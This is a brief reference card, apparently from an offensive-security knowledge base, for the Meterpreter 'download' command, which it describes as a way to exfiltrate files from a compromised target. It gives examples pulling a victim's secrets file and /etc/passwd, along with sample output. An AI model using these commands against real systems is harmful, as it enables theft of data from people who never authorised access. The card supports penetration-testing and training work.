---
type: command
executor: meterpreter
data: download /remote/path/source_file /local/path/destination_file
tags:
  - Meterpreter
  - File-Transfer
  - Download
platforms:
  - Windows
  - Linux
  - macOS
verified: true
validated: true
---

# meterpreter-download-file

## Command

```meterpreter
download /remote/path/source_file /local/path/destination_file
```

## Description

This command downloads a file from the target system to the attacker's local machine using the Meterpreter session. It is ideal for exfiltrating data and supports specifying a local destination path.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `/remote/path/source_file` | Full path to the file on the target machine | Yes |
| `/local/path/destination_file` | Destination path on the attacker's machine (optional rename) | No (defaults to same name) |

## Examples

### Basic Usage

```meterpreter
download C:\Users\victim\secrets.txt /home/attacker/secrets.txt
```

### Advanced Usage

```meterpreter
download /etc/passwd .
```

## Expected Output

[*] Downloading: C:\Users\victim\secrets.txt -> /home/attacker/secrets.txt
[*] Downloaded 1024.00 KiB of 1024.00 KiB (100.0%): C:\Users\victim\secrets.txt -> /home/attacker/secrets.txt
[*] Download completed, file saved to: /home/attacker/secrets.txt

Progress is shown with byte counts; success ends with a save confirmation.

## Related

- [[procedures/Meterpreter-File-Transfer]]
- [[commands/meterpreter-upload-file]]
